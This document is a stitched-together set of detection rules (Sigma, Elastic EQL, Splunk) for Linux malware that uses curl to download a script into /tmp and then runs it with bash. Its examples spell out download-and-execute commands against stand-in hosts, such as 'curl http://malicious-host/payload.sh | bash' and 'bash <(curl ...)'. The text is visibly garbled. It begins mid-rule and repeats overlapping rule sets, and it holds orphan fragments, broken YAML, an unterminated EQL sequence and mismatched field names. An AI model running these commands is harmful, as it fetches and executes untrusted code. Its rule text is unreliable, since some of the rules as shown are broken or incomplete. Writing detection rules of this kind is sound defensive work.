      - '/bin/bash'
      - '/bin/sh'
    CommandLine|contains:
      - '/tmp/'
    # Higher confidence if you want to reduce noise:
    # CommandLine|contains:
    #   - 'bash /tmp/'
    #   - 'sh /tmp/'
    #   - '.sh'
    #   - '.bash'

  single_step_chain:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
    CommandLine|contains:
      - 'bash /tmp/'
      - 'sh /tmp/'
      - '/tmp/'

  parent_curl_execution:
    ParentImage|endswith:
      - '/curl'
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains:
      - '/tmp/'

  falsepositives:
    - 'Legitimate software installers that download helper scripts into /tmp'
    - 'Build automation tools, CI/CD agents, or monitoring agents'
    - 'Administrator maintenance scripts using curl and bash from temp directories'

  condition: single_step_chain or parent_curl_execution

correlation:
  type: sequence
  timespan: 2m
  group_by:
    - HostName
    # Replace below with your platform-specific identifier:
    # - ProcessGuid
    # - ParentProcessGuid
    # - PID
    # - host.name, process.parent.pid
  steps:
    - rule: step1_curl_download
    - rule: step2_bash_execution
```

> If your Sigma backend does not support sequence/correlation rules, use the `single_step_chain` or `parent_curl_execution` conditions for direct command chaining, and create separate Stage 1 and Stage 2 rules to correlate in your SIEM.

---

## Elastic EQL Example

Elastic Security/EQL is a good fit because it supports sequence correlation.

``` eql
sequence by host.id with maxspan=2m
  [process where event.kind == "process_start"
    and event.type == "start"
    and (process.name == "curl" or process.executable == "*/curl")
    and process.command_line == (
      "* -o /tmp/*",
      "* --output /tmp/*",
      "* -O /tmp/*",
      "* > /tmp/*"
    )
  ]
  [process where event.kind == "process_start"
    and event.type == "start"
    and (process.name in ("bash", "sh") or process.executable in ("*/bash", "*/sh"))
    and process.command_line == (
      "*bash /tmp/*",
      "*sh /tmp/*",
      "*/tmp/*.sh*",
      "*/tmp/*.bash*"
    )
  ]
```

For higher fidelity, if your platform supports mapping fields between sequence steps, require the Step 2 command line to contain the same `/tmp` file path written by Step 1.

---

## Splunk Example

This Splunk example uses common process fields. Adjust field names if you use different telemetry sources.

```spl
index=process
  (process_name="*curl*" OR process_name="*bash*" OR process_name="*sh*")

| eval proc=lower(process_name)
| eval cmd=lower(process_command_line)
| rename _time AS event_time

| eval curl_download_event = 
    if(
      proc like "*curl*" AND
      cmd like "* /tmp/*" AND
      (cmd like "* -o *" OR cmd like "* --output *" OR cmd like "* -O *" OR cmd like "* > /tmp*"),
      1,
      0
    )

| eval bash_execution_event = 
    if(
      (proc like "*bash*" OR proc like "*sh*") AND
      cmd like "* /tmp/*" AND
      (cmd like "*bash /tmp/*" OR cmd like "*sh /tmp/*" OR cmd like "* /tmp/*.sh*" OR cmd like "* /tmp/*.bash*"),
      1,
      0
    )

| where curl_download_event=1 OR bash_execution_event=1

| sort 0 event_time

| streamstats window=2m 
    max(curl_download_event) as curl_seen_by host

| where bash_execution_event=1 AND curl_seen=1

| table 
    event_time,
    host,
    process_name,
    process_command_line,
    parent_process_name,
    parent_process_id
```

If your process index contains `ppid`, `parent_process_id`, or `ParentProcessGuid`, correlate by process lineage to reduce false positives:

```spl
| streamstats window=2m 
    max(curl_download_event) as curl_seen_by host ppid
```

---

## Higher-Fidelity Variants

### 1. Require a Script Extension

If you want fewer false positives, require that the downloaded file appears to be a bash script:

```text
Step 1 condition:
  command line contains:
    /tmp/*.sh
    /tmp/*.bash
    /tmp/install.sh
    /tmp/run.sh
    /tmp/setup.sh
    /tmp/agent.sh
```

Sigma snippet:

```yaml
detection:
  curl_download_script_to_tmp:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
```

This may miss malware that uses no file extension, so treat it as a high-confidence variant.

---

### 2. Use File Creation Events

If your telemetry includes file writes by `curl`, this is stronger evidence:

```text
process.name: curl
file.name: /tmp/*.sh
file.path: /tmp/*
```

Sigma:

```yaml
detection:
  curl_writes_tmp_script:
    Image|endswith:
      - '/curl'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|contains:
      - '.sh'
      - '.bash'
```

---

### 3. Detect Process-Tree Execution

If you have process tree data, alert when a descendant of `curl` is `bash` or `sh` and executes `/tmp`:

```text
ancestor.process.name: curl
ancestor.file_write: /tmp/*

descendant.process.name: bash OR sh
descendant.command_line: /tmp/*
```

This is stronger than simple time-window correlation on the same host.

---

## False Positive Guidance

Expect noise from:
- Legitimate installers that download helper scripts to `/tmp`
- CI/CD runners and build agents
- Monitoring agents
- Sysadmin maintenance scripts
- Package post-install or post-removal scripts
- Temporary scripts executed from `/tmp` by automation tools

Tuning options:
- Allow known signed processes or known parent applications.
- Exclude trusted automation tool paths.
- Require the downloaded file to be a script, executable, or marked suspicious.
- Correlate to outbound network connections from `curl`.
- Detect process tree lineage rather than host-only time correlation.
- Use file hash reputation for the executed `/tmp` script.
- Lower severity for admin accounts or known maintenance windows.

---

## Recommended Alert Fields

When this rule fires, include these fields in the alert:
- Hostname
- Timestamp
- User or service account
- Parent process name
- Parent process command line
- `curl` process command line
- Downloaded file path
- Executed file path
- Process tree IDs or GUIDs
- Source IP or URL if available from network events
- File hash if available

Example alert message:

```text
Malicious download-and-execute detected:
Host: {{host}}
User: {{account}}
curl downloaded a script to: {{downloaded_path}}
bash/sh executed script from /tmp: {{executed_path}}
Process tree: {{process_guid}} / {{parent_process_guid}}
Command line: {{command_line}}
```

---

## Companion Rule: Pipe Execution

The primary rule covers `curl -> /tmp -> bash`. You may also want to detect the direct pipe pattern:

```bash
curl http://malicious-host/payload.sh | bash
```

Example:

```yaml
title: Curl Piped Directly to Bash
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    ParentImage|endswith:
      - '/curl'
    CommandLine|contains:
      - '/tmp/'
      - 'curl'
  condition: selection
```

For pipe execution, look for:
- `curl` writing to stdout
- stdout piped directly into `bash`/`sh`
- process tree where `bash` is spawned from `curl`
- command lines containing:
  - `curl ... | bash`
  - `curl ... | sh`
  - `curl ... | bash /dev/stdin`
  - `bash <(curl ...)`

## Detection Rule: Linux `curl` Downloads Bash Script to `/tmp`, Followed by `bash` Execution

### Rule Logic / Conditions

Detect a **strict temporal correlation** of two process events:

1. **Download event**
   - `process.name` / `Image` is `curl`
   - Command line contains a remote URL, typically `http://` or `https://`
   - Command line writes or saves the downloaded content into `/tmp`
   - Command line references a Bash script target, commonly ending in `.sh`
   - Examples:
     - `curl https://host.example.com/payload.sh -o /tmp/payload.sh`
     - `curl --output /tmp/payload.sh https://host.example.com/payload.sh`
     - `curl https://host.example.com/payload.sh > /tmp/payload.sh`

2. **Execution event**
   - `process.name` / `Image` is `bash`
   - Command line executes a script from `/tmp`
   - Examples:
     - `bash /tmp/payload.sh`
     - `/bin/bash /tmp/payload.sh`
     - `/usr/bin/bash /tmp/payload.sh`

3. **Correlation**
   - Same `host.id`
   - Preferably same extracted `/tmp/...sh` script path, if normalization is available
   - `bash` execution occurs **after** the `curl` download
   - Time window: **5 minutes**

---

## Vendor-Neutral Correlation Rule

```yaml
id: linux-download-and-execute-curl-tmp-bash-script
name: "Linux: curl Downloads Bash Script to /tmp Followed by bash Execution"
description: >
  Detects a curl process downloading or saving a Bash script into /tmp followed
  by a bash process executing a script under /tmp within 5 minutes. This is a
  classic malware download-and-execute delivery pattern.

category: process_correlation
platform: linux
event_source: process_creation

time_window: 5m
ordering: strict

events:
  download_event:
    source: process_creation
    match:
      process_name:
        - curl
        - /usr/bin/curl
        - /usr/local/bin/curl
        - /bin/curl

      command_line_regex:
        - "\\bcurl\\b.*(?:https?|ftp)://.*(?:-o|--output)(?:\\s+|=)\\s*/tmp/[^\\s]+\\.sh\\b"
        - "\\bcurl\\b.*(?:https?|ftp)://.*>\\s*/tmp/[^\\s]+\\.sh\\b"
        - "\\bcurl\\b.*(?:https?|ftp)://.*--output-dir\\s+/tmp/[^\\s]+\\.sh\\b"

  execution_event:
    source: process_creation
    match:
      process_name:
        - bash
        - /bin/bash
        - /usr/bin/bash
        - /usr/local/bin/bash

      command_line_regex:
        - "\\bbash\\b\\s+/tmp/[^\\s]+\\.sh\\b"
        - "(?:/usr/bin/bash|/bin/bash|/usr/local/bin/bash)\\s+/tmp/[^\\s]+\\.sh\\b"

correlation:
  group_by:
    - host_id
    - script_path

  match_fields:
    - host_id
    - script_path

  require_order: true
  require_same_target: true
  max_gap_seconds: 300

fields:
  - host_id
  - timestamp
  - process_name
  - command_line
  - script_path
  - parent_process_name
  - parent_command_line

severity: high
confidence: high

mitre_attack:
  techniques:
    - "T1059.004"   # Command and Scripting Interpreter: Unix Shell
    - "T1105"       # Ingress Tool Transfer

false_positives:
  - legitimate administrative scripts stored in /tmp
  - software installation or update scripts
  - CI/CD jobs using /tmp as a staging area
```

---

## Elastic EQL-Style Rule

If you can normalize the downloaded/executed script path into a field such as `script_path`, use this higher-fidelity sequence:

```eql
sequence by host.id, script_path with maxspan=5m
  [process where host.os.type == "linux"
    and event.type == "start"
    and event.action in ("exec", "process-start")
    and process.name == "curl"
    and (
      regex_match(
        regex: process.command_line,
        pattern: "\\bcurl\\b.*(?:https?|ftp)://.*(?:-o|--output)(?:\\s+|=)\\s*/tmp/[^\\s]+\\.sh\\b"
      )
      or regex_match(
        regex: process.command_line,
        pattern: "\\bcurl\\b.*(?:https?|ftp)://.*>\\s*/tmp/[^\\s]+\\.sh\\b"
      )
      or regex_match(
        regex: process.command_line,
        pattern: "\\bcurl\\b.*(?:https?|ftp)://.*--output-dir\\s+/tmp/[^\\s]+\\.sh\\b"
      )
    )
  ]
  [process where host.os.type == "linux"

## Sigma Atomic Rules

Many SIEMs do not support correlation rules natively. In that case, create two Sigma rules and correlate them in your SIEM.

### Sigma Rule 1: `curl` Downloads Bash Script to `/tmp`

```yaml
title: curl Downloads Bash Script to /tmp
id: 6f97c3d4-51f1-4a7c-8d6e-912d318a49c1
status: experimental
description: >
  Detects curl saving or redirecting a downloaded Bash script into /tmp.
references:
  - https://attack.mitre.org/techniques/T1105/
author: SOC
date: 2026/05/28
tags:
  - attack.execution
  - attack.command_and_control

logsource:
  category: process_creation
  product: linux

detection:
  selection:
    Image|endswith:
      - '/curl'

    CommandLine|contains|all:
      - 'curl '
      - '/tmp/'
      - '.sh'

    CommandLine|contains:
      - 'http://'
      - 'https://'

  save_method:
    CommandLine|contains:
      - '-o /tmp/'
      - '--output /tmp/'
      - '--output=/tmp/'
      - '> /tmp/'
      - '--output-dir /tmp/'

  condition: selection and save_method

fields:
  - host.id
  - timestamp
  - process.pid
  - process.name
  - process.image
  - process.command_line
  - process.parent.name
  - process.parent.command_line

falsepositives:
  - legitimate administration or deployment scripts using /tmp

level: medium
```

## Sigma Correlation Rule Skeleton

If your SIEM supports Sigma 2.0 correlation rules, the logical rule can be expressed as:

```yaml
title: Linux Curl Download of /tmp Bash Script Followed by bash Execution
id: 2c65f7b6-8d8f-4f67-93b6-89d3d7a4b9c3
status: experimental
description: >
  Correlates curl downloading a Bash script into /tmp with bash executing a
  script under /tmp within 5 minutes.
author: SOC
date: 2026/05/28
tags:
  - attack.execution
  - attack.command_and_control

logsource:
  category: process_creation
  product: linux

detection:
  curl_download:
    selection:
      Image|endswith:
        - '/curl'

      CommandLine|contains|all:
        - 'curl '
        - '/tmp/'
        - '.sh'

      CommandLine|contains:
        - 'http://'
        - 'https://'

      CommandLine|contains:
        - '-o /tmp/'
        - '--output /tmp/'
        - '--output=/tmp/'
        - '> /tmp/'

    condition: selection

  bash_exec:
    selection:
      Image|endswith:
        - '/bash'

      CommandLine|contains|all:
        - 'bash '
        - '/tmp/'
        - '.sh'

    condition: selection

  correlation:
    type: temporal_ordered
    rules:
      - curl_download
      - bash_exec

    timespan: 5m

    group_by:
      - host.id

    where:
      - curl_download.script_path == bash_exec.script_path

fields:
  - host.id
  - timestamp
  - process.name
  - process.command_line
  - script_path

level: high
falsepositives:
  - administrative scripts using /tmp
```

> **Note:** The `script_path` field assumes your log pipeline or SIEM parser extracts the `/tmp/...sh` path from both `curl` and `bash` command lines. If you cannot extract `script_path`, group only by `host.id` and consider using file creation or file modification events for better fidelity.

## Single-Event Fallback Rule

Some malicious execution is chained inside one command line, for example:

```bash
bash -c "curl https://host.example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

For that pattern, this single-event rule can be useful:

```yaml
title: Chained curl /tmp Bash Script Download and Execution
id: 9c67d52e-7e84-48d9-bc7e-f35f7b3f2a2c
status: experimental
description: >
  Detects bash or sh executing a command line that contains both curl downloading
  a /tmp Bash script and bash/sh executing the same /tmp script.
author: SOC
date: 2026/05/28
tags:
  - attack.execution
  - attack.command_and_control

logsource:
  category: process_creation
  product: linux

detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'

    CommandLine|contains|all:
      - 'curl '
      - '/tmp/'
      - '.sh'
      - 'http://'

  condition: selection

fields:
  - host.id
  - timestamp
  - process.name
  - process.command_line
  - process.parent.name
  - process.parent.command_line

falsepositives:
  - legitimate deployment scripts executed by administrators
  - software installers using /tmp

level: medium
```

title: bash Executing /tmp Script After curl Parent Command
id: 4f2c9a8a-8a7f-4b11-9d6f-7b2c4d9e3f12
status: experimental

      - '/tmp/'
      - '.sh'

## Splunk Correlation Search Example

```spl
index=endpoint_logs sourcetype=process_exec
| where _time >= relative_time(now(), "-5m")
| search process_name="curl" command_line="*http*" command_line="*/tmp/*sh*"
| rex field=command_line
  "(?:-o|--output)(?:=|\\s+)(?<script_path>/tmp/[^\\s]+\\.sh)|>\\s*(?<script_path>/tmp/[^\\s]+\\.sh)"
| where isnotnull(script_path)
| stats min(_time) AS curl_time values(command_line) AS curl_cmd BY host_id script_path

| join type=inner max=1 host_id script_path
  [
    index=endpoint_logs sourcetype=process_exec
    | where _time >= relative_time(now(), "-5m")
    | search process_name="bash" command_line="*bash*" command_line="*/tmp/*sh*"
    | rex field=command_line "(?<script_path>/tmp/[^\\s]+\\.sh)"
    | where isnotnull(script_path)
    | stats min(_time) AS bash_time values(command_line) AS bash_cmd BY host_id script_path
  ]

| eval gap_seconds = bash_time - curl_time
| where gap_seconds >= 0 AND gap_seconds <= 300
| table host_id script_path curl_cmd curl_time bash_cmd bash_time gap_seconds
```

## Recommended Normalized Fields for Higher Fidelity

For best accuracy, extract and normalize these fields:

| Field | Source |
|---|---|
| `host_id` | Host metadata |
| `process_name` | Process binary name |
| `process_command_line` | Full command line |
| `script_path` | Extracted `/tmp/...sh` file path from `curl` and `bash` commands |
| `timestamp` | Event time |
| `parent_process_name` | Parent process |
| `parent_command_line` | Parent command line |

A simple parser rule for `script_path` can be:

```regex
/tmp/[^\s]+\.sh
```

Then correlate:

```sql
WHERE download.host_id = execute.host_id
  AND download.script_path = execute.script_path
  AND execute.timestamp >= download.timestamp
  AND execute.timestamp <= download.timestamp + INTERVAL 5 MINUTE
```

## Tuning Guidance

1. **Reduce false positives from legitimate scripts**
   - Exclude known deployment directories if `/tmp` usage is normal.
   - Exempt signed or approved management tools only if you have strong script/hash intelligence.
   - Consider filtering by `parent_process_name` if administrative tools routinely use `/tmp`.

2. **Improve fidelity with file events**
   - Correlate `curl` file creation/modification under `/tmp` with `bash` execution.
   - Preferred flow:
     - File event: `curl` creates `/tmp/payload.sh`
     - Process event: `bash` executes `/tmp/payload.sh`
     - Same host and path within 5 minutes.

3. **Detect extensionless scripts**
   - Malicious payloads may not use `.sh`.
   - To improve coverage, include patterns where:
     - `curl` writes a file to `/tmp`
     - `chmod +x /tmp/...` appears
     - `bash /tmp/...` or `/tmp/...` is executed

4. **Watch for symlink abuse**
   - Attackers may write to `/tmp/link.sh`, where the link points to `/home/user/real.sh`.
   - Resolve symlinks if available in your endpoint telemetry.
   - Correlate final file path, not just command-line path.

  FROM process_events
  WHERE process_name = 'bash'

text:
Below is a practical, high-confidence **Linux process creation detection rule** for the classic **download-and-execute** pattern:

> `curl` writes/downloads a Bash script into `/tmp` or `/var/tmp`, followed shortly by `bash`/`sh` execution of that script.

This is written as a **Sigma correlation rule** with sequence logic. It assumes Linux process telemetry such as **Sysmon for Linux**, **auditd**, or **ECS-formatted process events**.

```yaml
title: curl Downloads Bash Script to /tmp Followed by Bash Execution
id: 73615e2a-9333-5e63-9933-4b3f6d6b679b
status: experimental
description: >
  Detects a malicious download-and-execute pattern on Linux where a curl process
  downloads or writes a Bash script into /tmp or /var/tmp, followed by execution
  of that script by bash/sh.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105

logsource:
  category: process_creation
  product: linux
  service: sysmon

detection:
  selection_curl_download:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/bin/curl'
    CommandLine|re: >-
      (?i)
      \bcurl\b.*(?:-o|--output|-O)\s+(?:/tmp/|/var/tmp/).*\.sh\b
      |
      \bcurl\b.*(?:-o|--output|-O)\s+.*\.sh\b
      |
      \bcurl\b.*(?:1\s*>\s*|>)\s*(?:/tmp/|/var/tmp/).*\.sh\b
      |
      \bcurl\b.*\.sh\b.*(?:1\s*>\s*|>)\s*(?:/tmp/|/var/tmp/)

  selection_bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/zsh'
      - '/dash'
    CommandLine|re: >-
      (?i)
      \b(?:bash|sh|zsh|dash)\b.*\s(?:/tmp/|/var/tmp/).*\.sh\b
      |
      \b(?:bash|sh|zsh|dash)\b.*\bsource\b.*(?:/tmp/|/var/tmp/).*\.sh\b

  condition: selection_curl_download or selection_bash_execution

falsepositives:
  - Legitimate installers or update tools that write shell scripts to /tmp

## What the rule detects

Examples that would match:

- `curl -o /tmp/payload.sh hxxp://example[.]com/payload.sh`

- `curl --output /tmp/install.sh https://example[.]com/install.sh`

- `curl https://example[.]com/script.sh > /tmp/tmp/script.sh`
  followed by  
  `bash /tmp/tmp/script.sh`

## Important deployment note

The `correlation` block is the sequence logic. If your Sigma compiler or SIEM **does not support Sigma correlation**, do **not** deploy only the `condition` above, because that would alert on either event alone.

Instead, split it into two rules:

### Rule 1: `curl` downloads/writes Bash script
```yaml
title: curl Downloads Bash Script to /tmp
logsource:
  category: process_creation
  product: linux
  service: sysmon
detection:
  selection:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/bin/curl'
    CommandLine|re: >-
      (?i)
      \bcurl\b.*(?:-o|--output|-O)\s+(?:/tmp/|/var/tmp/).*\.sh\b
      |
      \bcurl\b.*(?:-o|--output|-O)\s+.*\.sh\b
      |
      \bcurl\b.*(?:1\s*>\s*|>)\s*(?:/tmp/|/var/tmp/).*\.sh\b
      |
      \bcurl\b.*\.sh\b.*(?:1\s*>\s*|>)\s*(?:/tmp/|/var/tmp/)
  condition: selection
level: medium
```

### Rule 2: `bash` executes script from `/tmp`
```yaml
title: bash Executes Script from /tmp
logsource:
  category: process_creation
  product: linux
  service: sysmon
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/zsh'
      - '/dash'
    CommandLine|re: >-
      (?i)
      \b(?:bash|sh|zsh|dash)\b.*\s(?:/tmp/|/var/tmp/).*\.sh\b
      |
      \b(?:bash|sh|zsh|dash)\b.*\bsource\b.*(?:/tmp/|/var/tmp/).*\.sh\b
  condition: selection
level: medium
```

Then correlate Rule 2 after Rule 1:
- same host
- within 5 minutes (tune as needed)
- ideally same extracted filename (e.g., `/tmp/<file>.sh`) if your SIEM supports joins

## Optional: Elastic / ECS EQL version

If you use Elastic Security/ECS, this logic is better expressed as an EQL sequence:

```eql
sequence by host.id {
  // 1. curl downloads/writes a .sh file under /tmp or /var/tmp
  process where host.id != "" and process.name == "curl" and
    (
      process.command_line =~ "(?i)\\bcurl\\b.*(?:-o|--output|-O)\\s+(?:/tmp/|/var/tmp/).*\\.sh"
      or process.command_line =~ "(?i)\\bcurl\\b.*(?:-o|--output|-O)\\s+.*\\.sh"
      or process.command_line =~ "(?i)\\bcurl\\b.*(?:1\\s*>\\s*|>)\\s*(?:/tmp/|/var/tmp/).*\\.sh"
    );

  // 2. bash/sh executes that script within 5 minutes
  5m process where host.id != "" and process.name in ("bash", "sh", "zsh", "dash") and
    (
      process.command_line =~ "(?i)\\b(?:bash|sh|zsh|dash)\\b.*\\s(?:/tmp/|/var/tmp/).*\\.sh"
      or process.command_line =~ "(?i)\\b(?:bash|sh|zsh|dash)\\b.*\\bsource\\b.*(?:/tmp/|/var/tmp/).*\\.sh"
    )
}
```

## Tuning recommendations

### 1. Tighten the timeframe
Start with `5m`, then adjust based on your environment:
- too many false positives → reduce to `2m`
- slow delivery + delayed execution → increase to `10m` or `15m`

### 2. Restrict the path if your objective is strictly `/tmp`
If you only care about `/tmp/`, replace `/var/tmp/` with `/tmp/` only.

### 3. Improve fidelity with filename correlation
The strongest version correlates the exact file downloaded in step 1 with the file executed in step 2. If your telemetry supports it, extract the script filename and require:

- step 1 output file: `/tmp/name.sh`
- step 2 execution argument: `/tmp/name.sh`

Otherwise you may get false positives from unrelated `curl` downloads followed by unrelated shell activity.

### 4. Add exclusions for known legitimate automation
Use `CommandLine` or `Image` exclusions for:
- internal package mirrors
- build agents
- configuration management scripts
- approved installation utilities

## Limitations

- The rule is **command-line based**, so it depends on the process logging the script path.
- If malware downloads a file named `/tmp/payload` with **no `.sh` extension**, this rule may miss it.

    - `curl` file writes to `/tmp/*`
    - followed by `bash` execution of files in `/tmp/*`
- If `source /tmp/file.sh` is run directly as a shell builtin without a new process event, visibility depends on your telemetry.

## Detection Rule: `curl` Downloads Bash Script to `/tmp`, Followed by `bash` Execution

### Rule Name
**Malicious Download-and-Execute of `/tmp` Bash Script via `curl`**

### Severity
**High**

### MITRE ATT&CK Mapping
- **T1105** – Ingress Tool Transfer  
- **T1059.004** – Command and Scripting Interpreter: Unix Shell  
- Likely used by downloader/dropper malware

---

## Core Correlation Logic

Alert when **both** of the following occur on the same host/user within a short window:

1. **Download step**
   - `curl` creates, writes, or redirects output to a Bash/shell script under `/tmp`
   - Example paths:
     - `/tmp/malware.sh`
     - `/tmp/payload.bash`
   - Example command patterns:
     - `curl http://evil.example/payload.sh -o /tmp/payload.sh`
     - `curl http://evil.example/payload.sh --output /tmp/payload.sh`
     - `curl http://evil.example/payload.sh > /tmp/payload.sh`
     - `curl http://evil.example/payload.sh | tee /tmp/payload.sh`

2. **Execution step**
   - `bash` executes a `/tmp` shell script
   - Examples:
     - `/bin/bash /tmp/payload.sh`
     - `bash /tmp/payload.sh`
     - `/tmp/payload.sh`
       - This often results in `/bin/bash /tmp/payload.sh` due to the shebang.

3. **Correlation**
   - Same `host`
   - Same `user`
   - Preferably same extracted `/tmp/*.sh` file path
   - Time window: **30 seconds to 5 minutes**  
     - Start with **5 minutes** for coverage.
     - Tighten to **30–60 seconds** to reduce false positives if needed.

---

## Portable Sigma-Style Rule

> This implementation assumes Linux process and/or file event telemetry. Field names such as `Image`, `CommandLine`, and `TargetFilename` may need to be mapped to your EDR/SIEM schema, e.g. `process.executable`, `process.command_line`, `file.path`.

### Atomic Rule 1: `curl` Downloads Bash Script to `/tmp`

```yaml
title: Curl Downloads Bash Script to /tmp
id: 7d013b5c-3b8f-4d81-a75d-a651d16a2f4a
status: experimental
description: >
  Detects curl creating, redirecting, or outputting a Bash/shell script into /tmp.
  This is the download stage of a classic curl download-and-execute malware pattern.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: any
detection:
  selection_file_write:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/usr/local/bin/curl'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|endswith:
      - '.sh'
      - '.bash'

  selection_cmdline_base:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/usr/local/bin/curl'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_cmdline_output:
    CommandLine|contains:
      - ' -o '
      - ' --output '
      - ' -O '
      - ' --remote-name '
      - '> /tmp/'
      - '| tee /tmp/'

  filter_known_deployment:
    CommandLine|contains:
      - '/tmp/deploy-'
      - '/tmp/install-'
      - '/tmp/upgrade-'

  condition: (selection_file_write or (selection_cmdline_base and selection_cmdline_output)) and not filter_known_deployment
```

### Atomic Rule 2: `bash` Executes `/tmp` Shell Script

```yaml
title: Bash Executes /tmp Shell Script
id: 9e4b55e1-77b9-4a25-8a62-4f32d999c0e3
status: experimental
description: >
  Detects bash executing a shell script located under /tmp.
references:
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection_bash_exec:
    Image|endswith:
      - '/bash'
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/usr/local/bin/bash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_script_direct:
    Image|startswith: '/tmp/'
    CommandLine|contains: '.sh'

  condition: selection_bash_exec or selection_script_direct
```

### Temporal Correlation Rule

> Deploy this only if your SIEM/Sigma tool supports temporal correlation rules. Otherwise, deploy Rules 1 and 2 separately and correlate them inside the SIEM.

```yaml
title: Curl Download of /tmp Bash Script Followed by Bash Execution
id: 66e52b52-9d65-4413-9793-42a2b15f9f16
status: experimental
description: >
  Correlates curl writing or redirecting a Bash shell script into /tmp with bash
  executing a /tmp shell script on the same host and user within 5 minutes.
  This behavior is consistent with malicious file download-and-execution.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: any
detection:
  correlation:
    type: temporal
    rules:
      - 7d013b5c-3b8f-4d81-a75d-a651d16a2f4a  # curl downloads script to /tmp
      - 9e4b55e1-77b9-4a25-8a62-4f32d999c0e3  # bash executes /tmp script
    timespan: 5m
    group_by:
      - Hostname
      - User
      # If your telemetry can normalize the executed/downloaded script path
      # on both events, add this field for higher fidelity:
      # - TargetFilename
      # or:
      # - ScriptPath
  condition: correlation
```

---

## Higher-Fidelity Correlation Requirement

The most accurate version of this rule correlates by the **actual script path**, not only by host and user.

If your platform can expose the file path on both events, use:

```text
host
user
script_path
```

Example correlation keys:

```text
host: server1.example.com
user: www-data
script_path: /tmp/payload.sh
```

If `script_path` is not available, you can still detect the pattern by:

```text
host + user + time window
```

However, that can produce more false positives on hosts where multiple legitimate or unrelated `/tmp` scripts are downloaded and executed near each other.

---

## Elastic EQL Example

For Elastic Security, the same behavior can be written as an EQL temporal sequence rule.

```eql
sequence by host.id with maxspan=5m
  [process where event.action == "start" and
    (
      process.name == "curl" or
      process.name == "/usr/bin/curl" or
      process.name == "/usr/local/bin/curl"
    ) and
    stringContains(process.command_line, "/tmp/") and
    stringContains(process.command_line, ".sh") and
    (
      stringContains(process.command_line, "-o") or
      stringContains(process.command_line, "--output") or
      stringContains(process.command_line, "-O") or
      stringContains(process.command_line, "> /tmp/") or
      stringContains(process.command_line, "tee /tmp/")
    )
  ]
  [process where event.action == "start" and
    (
      process.name == "bash" or
      process.name == "sh" or
      process.name == "/bin/bash" or
      process.name == "/usr/bin/bash"
    ) and
    stringContains(process.command_line, "/tmp/") and
    stringContains(process.command_line, ".sh")
  ]
```

> For higher fidelity, enrich or parse both events to include the exact `/tmp/*.sh` file path and correlate by `host.id`, `user.id`, and `file.path`.

---

## Splunk-Style Correlation Search Example

This assumes common process fields. Replace `process.executable`, `process.args`, `host`, `user`, and `script_path` with the actual fields from your index/normalization.

```spl
index=linux sourcetype=*process*
process.executable IN ("*/curl*", "*/bash*")
OR
process.name IN ("curl", "bash")

| eval cmdline=lower(coalesce(process.command_line, process.args, command))
| rex field=cmdline "(?<script>/tmp/[^\\s'\"]+\\.sh)"
| where isnotnull(script)

| eval is_curl = if(process.executable LIKE "%curl%", 1, if(process.name == "curl", 1, 0))
| eval is_bash = if(process.executable LIKE "%bash%", 1, if(process.name == "bash", 1, 0))

| stats
    min(_time) as first_seen
    max(_time) as last_seen
    sum(is_curl) as curl_count
    sum(is_bash) as bash_count
    values(cmdline) as commands
    by host user script

| where
    curl_count > 0
    AND bash_count > 0
    AND first_seen >= relative_time(now(), "-15m")
    AND (last_seen - first_seen) <= 300

```

> This Splunk example correlates events by the extracted `script` path, which improves fidelity. If the curl command uses shell redirection that is not present in the command-line field, add a file creation event source and join on `file.path`.

---

## Important Detection Notes

### 1. File Creation Events Improve Fidelity

Command-line detection is useful, but `curl` may write `/tmp` files via redirection or shell mechanisms that are not fully visible in the `curl` process command line.

Best data source:

```text
curl process event
  +
file creation event:
  file.path starts with /tmp/
  file.path ends with .sh or .bash
  process.name is curl
```

Then correlate:

```text
file creation /tmp/*.sh by curl
  followed by
bash process executing that exact /tmp/*.sh file
```

---

### 2. Working Directory Matters

A command like:

```bash
curl http://evil.example/payload.sh -O
```

may download `payload.sh` into the current working directory. If that working directory is `/tmp`, the command line may not contain `/tmp`. Detect this more reliably using file creation events and `cwd`.

Optional stronger download logic:

```yaml
detection:
  selection_curl_o:
    Image|endswith: '/curl'
    CommandLine|contains:
      - ' -O '
      - ' --remote-name '
    CurrentWorkingDirectory|startswith: '/tmp/'
```

Field names vary:

- `CurrentWorkingDirectory`
- `cwd`
- `process.working_directory`
- `Current Directory`

---

### 3. This Rule Does Not Fully Cover Pipe-to-Shell

This rule focuses on:

```bash
curl ... -o /tmp/x.sh
bash /tmp/x.sh
```

It does **not** fully detect:

```bash
curl http://evil.example/payload.sh | bash
```

That variant may not write to `/tmp` at all. You may want a separate rule for:

```text
curl or wget executed by shell with command line containing "| bash"
```

MITRE technique:

- **T1105** – Ingress Tool Transfer
- **T1059.004** – Command and Scripting Interpreter: Unix Shell
